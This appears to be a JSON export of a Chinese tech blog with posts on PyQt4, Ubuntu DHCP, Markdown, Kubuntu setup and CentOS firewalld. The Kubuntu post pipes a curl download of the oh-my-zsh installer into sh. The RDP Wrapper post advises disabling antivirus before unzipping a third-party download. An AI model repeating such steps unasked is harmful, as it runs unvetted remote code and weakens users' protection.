里面，样式表根据样式代码嵌入方式的不同，而分成了行内样式表，内部样式表和外部样式表三种 而在 qt 里面，改样式的方法也有很多种 1、在 Qt Designer 里面直接修改样式只需要选中目标元件，然后点击鼠标右键，选择” 改变样式表 “，就能打开样式表编辑窗口 然后在这里面直接写样式就可以改这个元件的样式了 加了之后直接点应用就可以以所见即所得的方式显示了 这样编写的样式通过 pyuic 编译之后，会在生成的 py 源代码里面看到这种东西 123self.pushButton.setStyleSheet(_fromUtf8(\"background: azure;\\n\"\"border: 1px solid gray;\\n\"\"border-radius: 10px;\")) 也就相当于 CSS 的行内样式表了，是针对元件级别的 2、在外面编写 qss 代码来修改修改样式首先先直接在外面新建一个 qss 文件 这时候也会像 css 一样，用到选择器和效果声明的结构，也就是 selector 和 declaration 结构 这里先随便写个样式进去 123QMainWindow &#123; background-color: blue;&#125; 保存，然后新建一个 py 文件，继承生成的那个类 （其实实际开发中也推荐这么做，因为 demo.py 是生成的，如果直接在上面改的话，哪天修改了 ui 界面，需要重新生成 demo.py，这时候你在 demo.py 上做的修改就会显得非常头疼） 12345678910111213141516171819# -*- coding: utf-8 -*-from demo import Ui_MainWindowfrom PyQt4 import QtGui, QtCoreclass Demo(QtGui.QMainWindow, Ui_MainWindow): \"\"\"qt stylesheet demo\"\"\" def __init__(self, parent = None): super(Demo, self).__init__(parent) self.setupUi(self) # 开始装载样式表 qss_file = open('style.qss').read() self.setStyleSheet(qss_file)import sysif __name__ == '__main__': a = QtGui.QApplication(sys.argv) app = Demo() app.show() a.exec_() 写好之后运行这个类，就可以看到我们刚才添加的样式了 其实 qt stylesheet 现在已经非常强大了，不仅支持 radius 这种半径渲染，像 CSS 一样支持了伪类，比如 hover,pressed 等 做一般的界面美化真是完全够用了，光凭这些完全可以做出非常美观的程序 3、通过 qss 生成器来设计 qss 样式我发现去找找还真有这种东西，一个很方便的 qss 编辑器，可以帮助你写出漂亮的 QSS 样式 作者把他开源并发布在了 sourceforge 上，地址：http://sourceforge.net/projects/qsseditor/ 这个我就不细说了，只是方便我们的一个小工具而已，看着喜欢的话可以去揣摩揣摩 最后做个总结：现在要写样式都是推荐使用外部 QSS 来写 跟 CSS 一样，其实是为了明确分工，做到质与形的分离，另一方面也是方便了样式的快速开发 做好外部的 QSS 之后，在 python 添加两行代码，把 qss 给挂进去就能见到效果了","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"PyQt4——使用 qrc 载入图片资源","slug":"105","date":"2015-12-07T19:01:00.000Z","updated":"2018-06-08T09:32:03.000Z","comments":true,"path":"archives/pyqt4-load-photo-image-resources-with-qrc.html","link":"","permalink":"https://hexo.bangz.me/archives/pyqt4-load-photo-image-resources-with-qrc.html","excerpt":"在使用 Qt Designer 设计界面的时候，经常会使用到外部的一些图片资源 但是我发现 Qt 它有自己的一套图片资源管理体系 甚至可以把外部图片编译成 PyQt 可以直接调用的 py 资源文件 看了之后真是大开眼界，原来还可以这么玩！ 如图，我的这一大堆图片文件全部编译到了 res_rc.py 里","text":"在使用 Qt Designer 设计界面的时候，经常会使用到外部的一些图片资源 但是我发现 Qt 它有自己的一套图片资源管理体系 甚至可以把外部图片编译成 PyQt 可以直接调用的 py 资源文件 看了之后真是大开眼界，原来还可以这么玩！ 如图，我的这一大堆图片文件全部编译到了 res_rc.py 里 更重要的是，它可以在 Qt Designer 里面直接引用这些资源！ 下面来说一下怎么实现的吧，我这里演示一下给一个按钮添加图标 这里做一个全新的例子，首先新建一个 MainWindow，然后把需要的控件拖进去，我这里拖一个 button 按钮 然后把里面的文字都给去掉，并修改 icon 属性 这个时候会看到里面什么都没有，不用急，我们把需要的图片先放到 images 目录下，调整好目录位置后 点击编辑资源 –&gt; 新建资源文件，给资源文件起个名字，然后点保存 这样资源文件就建好了 回到编辑资源窗口。然后新建一个前缀，比如叫 images 新建好之后就可以点右边的添加文件了，这时候把我们之前准备的图片文件给添加进来 这就是资源文件的使用方法，以后还需要图片的时候直接在这个窗口把需要的图片也添加进来即可 点确定，这时候我们之前准备的图片就可以用了 如果嫌图标太大或者太小，可以直接在属性栏里面改 iconSize 这时候我们这个简单的 UI 就算设计完了 保存出来，现在我们可以来总结下看到我们当前工程文件夹下的所有文件 搞清楚每个文件是干什么的，有什么作用之后，开始进行编译 还是老方法，需要用到命令行（有能力的话可以写批处理，文件一拖上去就能执行编译脚本），先 cd 到当前的工程目录 然后分别使用 pyuic 编译 ui 界面文件，同时需要使用到 pyrcc 来编译 qrc 资源文件 语法：12 编译 ui 文件 pyuic4.bat -x 源文件名. ui -o 目标文件名. py 编译 qrc 文件 pyrcc4 源文件名. qrc -o 目标文件名_rc.py 这样就算是编译完成了，直接运行 demo.py 即可看到效果 最后说一下，其实搞 qrc 资源文件的目的在于应付 Qt Designer 如果直接在 python 里面编码的话，直接调用图片 url 就行了，不用这么复杂的 这个 qrc 文件可以直接用 Qt Designer 来生成，也可以参照网上的一些教程直接用记事本写 xml 格式的文件 但是最终核心还是要用到 Qt Designer 中去，由于 python 不能直接识别 qrc 这种文件 所以必须通过 PyQt 给的 pyrcc 工具来把 qrc 资源文件也编译成 python 能够识别的 py 文件 另一方面，把 png, jpeg 等图片文件编译成 py 文件的话，相当于对资源文件进行了打包加密 也相当于对用户进行了隐藏，不用把图片直接暴露在用户的视线里 最后总结一下整体的思路，就是当 Qt Designer 需要调用外部图片资源的时候 使用 Qt Designer 自带的资源管理器引入外部图片资源文件，并装载进一个 qrc 列表文件 最后在编译的时候，除了编译 ui 文件，也需要把 qrc 文件一并编译 ui 文件的编译使用 pyuic，qrc 文件的编译使用 pyrcc","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"PyQt4——使用 Qt Designer 快速绘制 GUI 界面","slug":"104","date":"2015-12-05T23:09:00.000Z","updated":"2018-06-08T09:31:30.000Z","comments":true,"path":"archives/pyqt4-using-qt-designer-to-draw-gui.html","link":"","permalink":"https://hexo.bangz.me/archives/pyqt4-using-qt-designer-to-draw-gui.html","excerpt":"本人在前面 PyQt4 快速入门中将 PyQt 里面的常用控件用代码的形式实现了一遍 但实际上安装完 Qt 之后，那些 GUI 布局已经可以不用那么繁琐的一行一行地打代码 我们可以通过它自带的 Qt Designer 以所见即所得的方式快速完成复杂的 UI 布局 如图，Windows 下安装完 PyQt 后，开始菜单里面的 PyQt 项里面会有个 Designer，它就是我们需要的工具","text":"本人在前面 PyQt4 快速入门中将 PyQt 里面的常用控件用代码的形式实现了一遍 但实际上安装完 Qt 之后，那些 GUI 布局已经可以不用那么繁琐的一行一行地打代码 我们可以通过它自带的 Qt Designer 以所见即所得的方式快速完成复杂的 UI 布局 如图，Windows 下安装完 PyQt 后，开始菜单里面的 PyQt 项里面会有个 Designer，它就是我们需要的工具 运行它，并新建一个 MainWindow 这时候我们就可以看到我们容易理解的 GUI 设计界面了 跟大多数的图形化界面设计工具（比如 C#）一样，需要什么工具直接网上拖就可以了 弄完之后需要保存为一个 ui 文件 现在这个 ui 文件还不能够直接用，因为里面都是 xml 格式的内容 我们需要将他编译成 python 所能识别的内容 通过 pyqt 自带的 pyuic4 就可以进行编译了 pyuic4 需要在命令行里面执行，所以建议配置环境变量 以我的安装位置为例，我的 pyuic4 在这个位置 于是就把环境变量设置到这里去，D:\\Python27\\Lib\\site-packages\\PyQt4 接着启动 cmd，输入 pyuic4.bat –version 能够如图成功返回版本信息则说明安装成功 然后 cd 到 ui 文件的位置，并执行 pyuic4 编译 ui 文件 执行语法：1pyuic4.bat -x [原来的 ui 文件名] -o [目标文件名. py] 这样就算编译完成了，直接运行 bangzdemo.py 就能看到刚才拖的 qt 界面了","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"}]},{"title":"Windows 10 上的远程桌面多用户多开会话工具","slug":"100","date":"2015-11-19T23:56:00.000Z","updated":"2018-06-08T07:24:49.000Z","comments":true,"path":"archives/configure-remote-desktop-multi-session-on-windows-10.html","link":"","permalink":"https://hexo.bangz.me/archives/configure-remote-desktop-multi-session-on-windows-10.html","excerpt":"今天在实验室里的主机被某人从 win7 一下子跳到了 win10。。。 原来的 win7 会话多开功能一下子就没了，只要一个人开远程其他所有人都不能用了 实在是懒得换回去，这种情况下也不想上 windows server，但又想要有远程桌面多开功能，怎么办？ 翻了半天终于翻到了一个工具，可以完美的搞定这样的需求 这玩意太强大了，还全版本的 windows 客户端都支持！ 详细的就不说了，有需要的自己戳链接吧。","text":"今天在实验室里的主机被某人从 win7 一下子跳到了 win10。。。 原来的 win7 会话多开功能一下子就没了，只要一个人开远程其他所有人都不能用了 实在是懒得换回去，这种情况下也不想上 windows server，但又想要有远程桌面多开功能，怎么办？ 翻了半天终于翻到了一个工具，可以完美的搞定这样的需求 这玩意太强大了，还全版本的 windows 客户端都支持！ 详细的就不说了，有需要的自己戳链接吧。 源地址： https://github.com/binarymaster/rdpwrap/releases 上面的下载不了的话就点这里 链接: http://pan.baidu.com/s/1mg0Ewu0 密码: i3aa 使用方法： 解压后直接运行 install.bat 就可以安装了，不过解压之前最好先关掉杀软，这个软件容易被杀软误伤 安装完毕后可以在 RDPConf.exe 中查看安装的状态","categories":[{"name":"实用工具","slug":"实用工具","permalink":"https://hexo.bangz.me/categories/实用工具/"}],"tags":[]},{"title":"关于 Ubuntu 下的 DHCP 服务器的配置","slug":"97","date":"2015-10-14T21:41:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/setup-dhcp-server-on-ubuntu.html","link":"","permalink":"https://hexo.bangz.me/archives/setup-dhcp-server-on-ubuntu.html","excerpt":"今天在研究 ubuntu 下尝试建立 pxe 服务器的时候遇到了个很蛋疼的问题 前面 tftp 都配的好好的，然后就是 dhcp 服务器打死都启动不了，怪事 倒腾了半天，发现 ubuntu 下关于这一块真是乱 首先本来以为要安装 dhcp 服务器只要安装 dhcpd 就行了，于是 apt-get install dhcpd 结果发现不行 就去上网查了一下，原来 ubuntu 下使用的是 dhcp3-server 于是 apt-get install dhcp3-server 发现装的包的名字是 isc-dhcp-server（这么多名字！！！） 弄完之后测试启动 dhcp 服务器，然后遇到这个问题：1234/etc/init.d/isc-dhcp-server restart * Stopping ISC DHCP server dhcpd [fail] * Starting ISC DHCP server dhcpd * check syslog for diagnostics. [fail] 。。。这是什么问题呢？？？？","text":"今天在研究 ubuntu 下尝试建立 pxe 服务器的时候遇到了个很蛋疼的问题 前面 tftp 都配的好好的，然后就是 dhcp 服务器打死都启动不了，怪事 倒腾了半天，发现 ubuntu 下关于这一块真是乱 首先本来以为要安装 dhcp 服务器只要安装 dhcpd 就行了，于是 apt-get install dhcpd 结果发现不行 就去上网查了一下，原来 ubuntu 下使用的是 dhcp3-server 于是 apt-get install dhcp3-server 发现装的包的名字是 isc-dhcp-server（这么多名字！！！） 弄完之后测试启动 dhcp 服务器，然后遇到这个问题：1234/etc/init.d/isc-dhcp-server restart * Stopping ISC DHCP server dhcpd [fail] * Starting ISC DHCP server dhcpd * check syslog for diagnostics. [fail] 。。。这是什么问题呢？？？？ 按照提示我去找了 syslog，发现 log 里的东西也没有什么，更不知道怎么解决，然后上网查 然后翻了老半天都不知道怎么回事 最后在这里看到了点线索 http://askubuntu.com/questions/499056/setting-up-dhcp-server-fail-to-start-stop-it 于是照着做，把 dhcp 所对应的网卡给配了1sudo vi /etc/default/isc-dhcp-server 把里面的 INTERFACES 属性配成 eth0 即：1INTERFACES=\"eth0\" 然后再重启 isc-dhcp-server 123/etc/init.d/isc-dhcp-server restart * Stopping ISC DHCP server dhcpd [ OK ] * Starting ISC DHCP server dhcpd [ OK ] 这样就终于正常了 总结：在配置 dhcp 的时候一定要先配置操作的接口 另附：PXE 网络启动原理图","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[]},{"title":"GitHub 上 Readme.md 的编写方法（Markdown 语法）","slug":"95","date":"2015-10-09T23:30:00.000Z","updated":"2018-06-08T09:25:32.000Z","comments":true,"path":"archives/writing-readme-with-markdown-syntax.html","link":"","permalink":"https://hexo.bangz.me/archives/writing-readme-with-markdown-syntax.html","excerpt":"大标题大标题一般显示工程名, 类似 html 的 \\你只要在标题下面跟上 ===== 即可 中标题中标题一般显示重点项, 类似 html 的 \\你只要在标题下面输入 —— 即可","text":"大标题大标题一般显示工程名, 类似 html 的 \\你只要在标题下面跟上 ===== 即可 中标题中标题一般显示重点项, 类似 html 的 \\你只要在标题下面输入 —— 即可 小标题小标题类似 html 的 \\小标题的格式如下 ### 小标题注意 #和标题字符中间要有空格 注意!!! 下面所有语法的提示我都先用小标题提醒了!!! 单行文本框这是一个单行的文本框, 只要两个 Tab 再输入文字即可 多行文本框这是一个有多行的文本框 你可以写入代码等, 每行文字只要输入两个 Tab 再输入文字即可 这里你可以输入一段代码 比如我们可以在多行文本框里输入一段代码, 来一个 Java 版本的 HelloWorld 吧public class HelloWorld { /** * @param args */ public static void main(String[] args) { System.out.println(&quot;Hello World!&quot;); } } 链接1.点击这里你可以链接到 www.google.com2.点击这里我你可以链接到我的博客 只是显示图片 想点击某个图片进入一个网页, 比如我想点击 github 的 icon 然后再进入 www.github.com![image][image]: http://github.com/github.png “github” 文字被些字符包围 文字被些字符包围 只要再文字前面加上 &gt; 空格即可 如果你要换行的话, 新起一行, 输入 &gt; 空格即可, 后面不接文字但 &gt; 只能放在行首才有效 文字被些字符包围, 多重包围 文字被些字符包围开始 只要再文字前面加上 &gt; 空格即可 如果你要换行的话, 新起一行, 输入 &gt; 空格即可, 后面不接文字 但 &gt; 只能放在行首才有效 特殊字符处理有一些特殊字符如 &lt;,# 等, 只要在特殊字符前面加上转义字符 \\ 即可你想换行的话其实可以直接用 html 标签 &lt; br /&gt;","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[]},{"title":"kubuntu 安装折腾记","slug":"93","date":"2015-10-06T03:40:00.000Z","updated":"2018-06-08T09:19:28.000Z","comments":true,"path":"archives/recording-of-kubuntu-installation.html","link":"","permalink":"https://hexo.bangz.me/archives/recording-of-kubuntu-installation.html","excerpt":"最近在 B 站上看到 KDE 弄的很漂亮 http://www.bilibili.com/video/av2569221/ 于是开始眼馋，自己也想弄一弄了 顺手下了个 kubuntu，现在现在虚拟机上试跑一下，记录一下搞美化需要的步骤 刚装好 kubuntu 之后 发现自带的效果还挺不错，而且在虚拟机里面的动画效果也很流畅，基本感觉不到卡顿","text":"最近在 B 站上看到 KDE 弄的很漂亮 http://www.bilibili.com/video/av2569221/ 于是开始眼馋，自己也想弄一弄了 顺手下了个 kubuntu，现在现在虚拟机上试跑一下，记录一下搞美化需要的步骤 刚装好 kubuntu 之后 发现自带的效果还挺不错，而且在虚拟机里面的动画效果也很流畅，基本感觉不到卡顿 1、解决终端光标问题 刚选了中文版安装完，打开终端一看，果然，发现光标明显错位了，于是换等宽字体 设置 -&gt; 编辑当前方案 -&gt; 外观 -&gt; 选择字体 -&gt; 选择 Dejavu Sans Mono 这样终端就显示正常了 2、解决显示分辨率问题现在又有一个问题了，虚拟机默认的分辨率是 800600，太小了，我想换成 1366768，怎么办？ 下意识的去开始菜单里面搜索了 display，找到 “显示” 点开一看 哇！这啥？改分辨率的选项呢？？？ 折腾了半天，上网搜了一圈，都没人知道这是怎么弄的。。。。 于是，细心的我开始慢慢揣摩了。。。左上角写的 “大小和方向”，可是在哪里改呢？？ 一个不经意间，鼠标划过一个小按钮，于是看到了这个 点开来看看 靠，居然在这里！这什么鬼设计！你 @%#￥……#%…… 害我找半天！！！这么常用的功能居然摆在这么不显眼的位置。。。。。 好了，还好能改，不过这玩意第一次使用的时候，真心不容易发现~~ 3、实现虚拟机剪贴板共享因为装在虚拟机上，为了共享剪贴板，需要装 vmware tools 在虚拟机的菜单上按安装 vmware tools 之后它会以设备的形式自动挂载 看样子是默认挂载到了 / media / 用户名 / vmware tools 下 对了，在这里必须说明一下，为了稳定性，这个 vmware tools 是需要现场编译的，所以在安装它之前需要先安装 gcc1sudo apt-get install build-essential 安装完 gcc 之后就能正常的安装 vmware-tools 了 由于 media 是只读的，先复制一份出来1cp /media/bangz/VMware\\ Tools/VMwareTools-9.6.1-1378637.tar.gz ~/ 然后解压出来1tar zxvf VMwareTools-9.6.1-1378637.tar.gz 接着运行安装程序，自动编译安装 vmware-tools（需要权限）1sudo ./vmware-tools-distrib/vmware-install.pl 根据提示一路回车下去就行了 安装完之后会有提示12345To enable advanced X features (e.g., guest resolution fit, drag and drop, and file and text copy/paste), you will need to do one (or more) of the following:1. Manually start /usr/bin/vmware-user2. Log out and log back into your desktop session; and,3. Restart your X session. 翻译一下 1、手动启动 / usr/bin/vmware-user 2、注销再重新登录桌面 3、重启 X session 于是按照上面的做，在终端里面输入1sudo /usr/bin/vmware-user 然后注销，重新登录。 再用 ctrl+alt+f1 切换到终端界面去，登录自己的用户，然后找到对应的进程，kill 掉，重启123ps -e | grep Xsudo kill PID_OBTAINED_ABOVE startx &amp; 这样就基本上搞定了 4、设置终端使用英文刚才用 Ctrl+Alt+F1 切换到终端界面的时候，发现所有的中文都显示不出来 想了想，换英文？我在中国，经常要开发中文软件，桌面最好还是中文的，要换就只换终端吧 于是干脆在终端直接修改环境变量，输入12LANGUAGE=en_US -LANG=en_US.UTF-8 这倒是实现了，不过要实现每次开启终端都自动修改语言的话，还有待研究 5、用美丽的 oh-my-zsh 替换原来的 bash安装 zsh1sudo apt-get install zsh 安装 oh-my-zsh1sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 修改 oh-my-zsh 主题样式1vi ~/.zshrc 找到 ZSH-THEME，改成自己喜欢的样式，具体样式名见：https://github.com/robbyrussell/oh-my-zsh/wiki/External-themes1ZSH_THEME=\"agnoster\" 解决字体显示问题123sudo apt-get install gitgit clone https://github.com/powerline/fonts.git./fonts/install.sh 解决中文显示乱码问题1vi ~/.zshrc 配置语言环境变量123export LC_ALL=en_US.UTF-8export LANG=en_US.UTF-8export LANGUAGE=en_US.UTF-8 最后再配置 konsole 默认打开 zsh 就好了 6、安装 chrome1wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb 1sudo dpkg -i google-chrome-stable_current_amd64.deb","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"}]},{"title":"CentOS7 下 firewalld 的基本使用方法","slug":"92","date":"2015-09-17T02:04:00.000Z","updated":"2018-06-08T09:18:15.000Z","comments":true,"path":"archives/centos-7-firewalld-tutorial.html","link":"","permalink":"https://hexo.bangz.me/archives/centos-7-firewalld-tutorial.html","excerpt":"在 CentOS 7 中，引入了一个新的服务 Firewalld，下面一张图，让大家明确的了解 Firewall 与 iptables 之间的关系与区别。 安装它，只需1# yum install firewalld 如果在 GUI 桌面环境下需要图形界面工具的话，则再安装1# yum install firewall-config","text":"在 CentOS 7 中，引入了一个新的服务 Firewalld，下面一张图，让大家明确的了解 Firewall 与 iptables 之间的关系与区别。 安装它，只需1# yum install firewalld 如果在 GUI 桌面环境下需要图形界面工具的话，则再安装1# yum install firewall-config 一、介绍防火墙守护 firewalld 服务引入了一个信任级别的概念来管理与之相关联的连接与接口。它支持 ipv4 与 ipv6，并支持网桥，采用 firewall-cmd (command) 或 firewall-config (gui) 来动态的管理 kernel netfilter 的临时或永久的接口规则，并实时生效而无需重启服务。 Firewall 能将不同的网络连接归类到不同的信任级别，Zone 提供了以下几个级别 drop: 丢弃所有进入的包，而不给出任何响应 block: 拒绝所有外部发起的连接，允许内部发起的连接 public: 允许指定的进入连接 external: 同上，对伪装的进入连接，一般用于路由转发 dmz: 允许受限制的进入连接 work: 允许受信任的计算机被限制的进入连接，类似 workgroup home: 同上，类似 homegroup internal: 同上，范围针对所有互联网用户 trusted: 信任所有连接 二、使用方法1234# systemctl start firewalld # 启动,# systemctl enable firewalld # 开机启动 # systemctl stop firewalld # 关闭 # systemctl disable firewalld # 取消开机启动 具体的规则管理，可以使用 firewall-cmd，具体的使用方法可以 1$ firewall-cmd --help 1. 查看规则查看运行状态 1$ firewall-cmd --state 查看已被激活的 Zone 信息 123$ firewall-cmd --get-active-zonespublic interfaces: eth0 eth1 查看指定接口的 Zone 信息 12$ firewall-cmd --get-zone-of-interface=eth0public 查看指定级别的接口 12$ firewall-cmd --zone=public --list-interfaceseth0 查看指定级别的所有信息，譬如 public 12345678910$ firewall-cmd --zone=public --list-allpublic (default, active) interfaces: eth0 sources: services: dhcpv6-client http ssh ports: masquerade: no forward-ports: icmp-blocks: rich rules: 查看所有级别被允许的信息 1$ firewall-cmd --get-service 查看重启后所有 Zones 级别中被允许的服务，即永久放行的服务 1$ firewall-cmd --get-service --permanent 2. 管理规则12345# firewall-cmd --panic-on # 丢弃 # firewall-cmd --panic-off # 取消丢弃 $ firewall-cmd --query-panic # 查看丢弃状态 # firewall-cmd --reload # 更新规则，不重启服务 # firewall-cmd --complete-reload # 更新规则，重启服务 添加某接口至某信任等级，譬如添加 eth0 至 public，再永久生效 1# firewall-cmd --zone=public --add-interface=eth0 --permanent 设置 public 为默认的信任级别 1# firewall-cmd --set-default-zone=public a. 管理端口列出 dmz 级别的被允许的进入端口 1# firewall-cmd --zome=dmz --list-ports 允许 tcp 端口 8080 至 dmz 级别 1# firewall-cmd --zone=dmz --add-port=8080/tcp 允许某范围的 udp 端口至 public 级别，并永久生效 1# firewall-cmd --zome=public --add-port=5060-5059/udp --permanent b. 管理服务添加 smtp 服务至 work zone 1# firewall-cmd --zone=work --add-service=smtp 移除 work zone 中的 smtp 服务 1# firewall-cmd --zone=work --remove-service=smtp c. 配置 ip 地址伪装查看 1# firewall-cmd --zone=external --query-masquerade 打开伪装 1# firewall-cmd --zone=external --add-masquerade 关闭伪装 1# firewall-cmd --zone=external --remove-masquerade d. 端口转发要打开端口转发，则需要先 1# firewall-cmd --zone=external --add-masquerade 然后转发 tcp 22 端口至 3753 1# firewall-cmd --zone=external --add-forward-port=port=22:proto=tcp:toport=3753 转发 22 端口数据至另一个 ip 的相同端口上 1# firewall-cmd --zone=external --add-forward-port=port=22:proto=tcp:toaddr=192.168.1.100 转发 22 端口数据至另一 ip 的 2055 端口上 1# firewall-cmd --zone=external --add-forward-port=port=22:proto=tcp:toport=2055:toaddr=192.168.1.100 e. IP 封禁1# firewall-cmd --permanent --add-rich-rule=&quot;rule family=&apos;ipv4&apos; source address=&apos;222.222.222.222&apos; reject&quot; 以上都是一些常用方法，更多高级方法，请参考： https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/7/html/Security_Guide/sec-Using_Firewalls.html https://fedoraproject.org/wiki/FirewallD","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"CentOS","slug":"CentOS","permalink":"https://hexo.bangz.me/tags/CentOS/"}]},{"title":"PyQt4 快速入门","slug":"87","date":"2015-08-16T01:04:00.000Z","updated":"2018-06-08T10:26:51.000Z","comments":true,"path":"archives/fast-learning-pyqt-4.html","link":"","permalink":"https://hexo.bangz.me/archives/fast-learning-pyqt-4.html","excerpt":"之前在网上看到别人写的桌面程序非常漂亮 很想自己也写出像 huhumhire-hosts 那样漂亮的桌面应用程序 仔细一查，原来是用 PyQt 写的，于是自己也下定了决心来学学这个 目前国内好像没有多少关于这方面的比较系统的入门教程 于是只好自己摸索。 一次偶然的机会，在油土鳖上看到了一个比较不错的视频 https://www.youtube.com/watch?v=DF_44sWnAsk&amp;list=PLQVvvaa0QuDdVpDFNq4FwY9APZPGSUyR4 听了下这个大神讲的课，感觉非常不错，虽然可能需要点英语水平，不过不是什么大问题 这里就把他所讲到的这些例子给列出来吧","text":"之前在网上看到别人写的桌面程序非常漂亮 很想自己也写出像 huhumhire-hosts 那样漂亮的桌面应用程序 仔细一查，原来是用 PyQt 写的，于是自己也下定了决心来学学这个 目前国内好像没有多少关于这方面的比较系统的入门教程 于是只好自己摸索。 一次偶然的机会，在油土鳖上看到了一个比较不错的视频 https://www.youtube.com/watch?v=DF_44sWnAsk&amp;list=PLQVvvaa0QuDdVpDFNq4FwY9APZPGSUyR4 听了下这个大神讲的课，感觉非常不错，虽然可能需要点英语水平，不过不是什么大问题 这里就把他所讲到的这些例子给列出来吧 1、Hello World 程序（QMainWindow） 一个最简单的 PyQt4 窗口程序：1234567891011121314# -*- coding: utf-8 -*-from PyQt4 import QtGui # 导入 PyQt4 包 import sysclass Window(QtGui.QMainWindow): \"\"\"docstring for ClassName\"\"\" def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 500) # 设置窗体大小 self.show() # 显示窗体 app = QtGui.QApplication(sys.argv)GUI = Window() # 将 Window 实例化并写入全局变量 GUIsys.exit(app.exec_()) # 设置程序出口 2、按钮控件 Buttons（QPushButton）在上例的基础上添加代码：12345678910111213141516171819202122# -*- coding: utf-8 -*-from PyQt4 import QtGui, QtCore # 导入 PyQt4 包 import sysclass Window(QtGui.QMainWindow): \"\"\"docstring for ClassName\"\"\" def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 500) # 设置窗体大小 self.setWindowTitle(u\"PyQt4 按钮演示\") # 设置窗体标题 self.home() # 调用按钮初始化方法 def home(self): btn = QtGui.QPushButton(u\"退出程序\", self) # 实例化一个按钮 btn.clicked.connect(QtCore.QCoreApplication.instance().quit) # 给按钮绑定事件，当点击按钮时，触发 quit 方法 btn.resize(100, 100) # 设置按钮大小 btn.move(100, 100) # 设置按钮所在位置 self.show() # 显示窗体 app = QtGui.QApplication(sys.argv)GUI = Window() # 将 Window 实例化并写入全局变量 GUIsys.exit(app.exec_()) # 设置程序出口 3、按钮事件控制 Button Functions在上例的基础上添加代码：123456789101112131415161718192021222324252627# -*- coding: utf-8 -*-from PyQt4 import QtGui, QtCore # 导入 PyQt4 包 import sysclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 500) self.setWindowTitle(u\"PyQt4 按钮演示\") self.home() def home(self): btn = QtGui.QPushButton(u\"退出程序\", self) btn.clicked.connect(self.close_application) # 连接自身的方法 #btn.resize(100, 100) #btn.move(100, 100) btn.resize(btn.minimumSizeHint()) # 自动决定按钮大小 btn.move(0, 0) self.show() def close_application(self): sys.exit()app = QtGui.QApplication(sys.argv)GUI = Window()sys.exit(app.exec_()) 4、菜单栏 menubar（QMenuBar）123456789101112131415161718192021222324252627282930# -*- coding: utf-8 -*-from PyQt4 import QtGui, QtCore # 导入 PyQt4 包 import sysclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 500) self.setWindowTitle(u\"PyQt4 按钮演示\") extractAction = QtGui.QAction(\"&amp;GET TO THE CHOPPAH!!\", self) # 退出程序选项，快捷键为 G extractAction.setShortcut(\"Ctrl+Q\") # 设置全局快捷键为 Ctrl+Q extractAction.setStatusTip(\"Leave the app\") # 设置状态栏提示 extractAction.triggered.connect(self.close_application) # 设置链接到的动作 self.statusBar() # 初始化状态栏 mainMenu = self.menuBar() # 初始化菜单栏并将菜单栏对象赋值给 mainMenu fileMenu = mainMenu.addMenu(\"&amp;File\") # 添加菜单项并设置快捷键为 F fileMenu.addAction(extractAction) # 给菜单项添加子项 self.show() def close_application(self): sys.exit()app = QtGui.QApplication(sys.argv)GUI = Window()sys.exit(app.exec_()) 效果图： 5、工具栏 toolbar（QToolBar）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import sysfrom PyQt4 import QtGui, QtCoreclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 300) self.setWindowTitle('PyQT menubar tuts') self.setWindowIcon(QtGui.QIcon('footer-linkedin.png')) extractAction = QtGui.QAction(\"&amp;GET TO THE CHOPPAH!!\", self) extractAction.setShortcut(\"Ctrl+Q\") extractAction.setStatusTip(\"Leave the App\") extractAction.triggered.connect(self.close_application) self.statusBar() mainMenu = self.menuBar() fileMenu = mainMenu.addMenu('&amp;File') fileMenu.addAction(extractAction) self.home() def home(self): btn = QtGui.QPushButton('Quit', self) btn.clicked.connect(self.close_application) btn.resize(btn.minimumSizeHint()) btn.move(100, 100) # 从这里开始建立一个带图标的动作按钮 extractAction = QtGui.QAction(QtGui.QIcon('footer-linkedin.png'), \"Flee the scene\", self) extractAction.triggered.connect(self.close_application) self.toolBar = self.addToolBar('Extraction') # 新建一个工具栏 self.toolBar.addAction(extractAction) # 在这个工具栏上添加按钮 self.show() def close_application(self): print('whoaaaaa so custom!!') sys.exit()def run(): app = QtGui.QApplication(sys.argv) GUI = Window() sys.exit(app.exec_())run() 效果图 6、弹出消息窗口 pop up message（QMessageBox）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# coding: utf-8import sysfrom PyQt4 import QtGui, QtCoreclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 300) self.setWindowTitle(&apos;PyQT menubar tuts&apos;) 